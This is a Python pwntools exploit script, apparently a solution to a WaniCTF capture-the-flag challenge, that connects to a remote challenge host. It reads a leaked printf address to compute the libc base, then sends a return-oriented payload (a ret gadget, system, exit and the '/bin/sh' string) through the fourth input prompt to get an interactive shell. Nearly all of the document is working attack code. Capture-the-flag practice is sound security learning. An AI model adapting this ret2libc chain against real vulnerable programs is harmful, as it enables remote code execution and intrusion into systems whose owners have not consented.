from pwn import remote, ELF, p64, log, context, process

# context.log_level = "debug"
def exploit(reorlocal):
    if(reorlocal == False):
        r = process('./chall')
    else:
        r = remote('chal-lz56g6.wanictf.org', 9005)

    libc_elf = ELF('libc.so.6')

    printf_libc = libc_elf.symbols['printf']

    print(f"Address of printf() in libc: {hex(printf_libc)}")

    r.recvuntil(b"= ")

    printf_leak = int(r.recv(14).decode(), 16)

    log.info(f"Address of leaked printf() in libc: {hex(printf_leak)}")

    # Calculate the libc base
    libc_base = printf_leak - printf_libc

    # Calculate gadgets
    pop_rdi = libc_base + 0x10f75b
    ret = libc_base + 0x2882f

    system_addr = libc_base +  libc_elf.symbols['system']
    execve_addr = libc_base + 0xef52b
    exit_addr = libc_base + libc_elf.symbols['exit']
    binsh_addr = libc_base + next(libc_elf.search(b'/bin/sh'))

    # system_addr = printf_leak - 0x79b0
    # exit_addr = printf_leak - 0x18560
    # binsh_addr = printf_leak + 0x16b33f

    log.info(f"Address of libc base: {hex(libc_base)}")
    log.info(f"Address of leaked system() in libc: {hex(system_addr)}")
    log.info(f"Address of 'pop rdi; ret' gadget: {hex(pop_rdi)}")
    log.info(f"Address of 'ret' gadget: {hex(ret)}")
    log.info(f"Address of leaked execve() in libc: {hex(execve_addr)}")
    # log.info(f"Address of leaked exit() in libc: {hex(exit_addr)}")
    log.info(f"Address of leaked /bin/sh in libc: {hex(binsh_addr)}")

    r.recvline()

    for i in range(0, 4):
        if(i != 3):
            r.sendlineafter(": ", b".")
            r.sendlineafter(": ", b".")
            r.sendlineafter(": ", b".")
        
        else:
            payload = p64(ret)             # Just to align the stack
            # payload += p64(pop_rdi)
            # payload += p64(binsh_addr)
            # payload += p64(system_addr)

            payload += p64(system_addr)
            payload += p64(exit_addr)
            payload += p64(binsh_addr)
            
            r.sendlineafter(": ", payload)
            r.sendlineafter(": ", b".")
            r.sendlineafter(": ", b".")
            r.interactive()

exploit(True)